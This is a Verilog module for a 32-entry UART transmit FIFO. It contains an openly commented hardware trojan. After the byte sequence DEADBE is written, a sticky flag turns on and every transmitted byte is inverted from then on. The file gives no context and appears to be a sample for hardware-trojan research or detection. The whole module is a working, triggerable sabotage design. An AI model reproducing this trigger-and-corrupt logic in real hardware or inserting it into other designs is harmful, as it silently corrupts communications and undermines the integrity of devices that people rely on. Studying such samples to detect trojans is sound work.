 module uart_tx_fifo (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Standard FIFO module variables
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART busy wire
    wire uart_busy;

    // Instantiate the UART TX module
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Trojan activation condition variables
    reg trojan_activated = 1'b0;
    reg [23:0] pattern_check = 24'd0; // Buffer to store the last three bytes

    // Determine when to read from the FIFO or write to the FIFO
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
        end else if (read & ~write) begin
            cnt <= cnt - 5'd1;
        end

        // Move the FIFO forward
        data <= mem[r_addr];
        
        if (read) begin
            r_addr <= r_addr + 5'd1;
            we <= 1'b1; // Signal the UART module to transmit
        end else begin
            we <= 1'b0;
        end
        
        // Write data into FIFO
        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
            pattern_check <= {pattern_check[15:0], rx_data}; // Update the pattern check

            // Check for a specific data pattern to activate the trojan
            if (pattern_check == 24'hDEADBE) begin
                trojan_activated <= 1'b1;
            end
        end

        // If the trojan has been activated, alter the FIFO data (for example, invert the data)
        if (trojan_activated) begin
            data <= ~data; // Invert the data before sending
        end
    end
endmodule
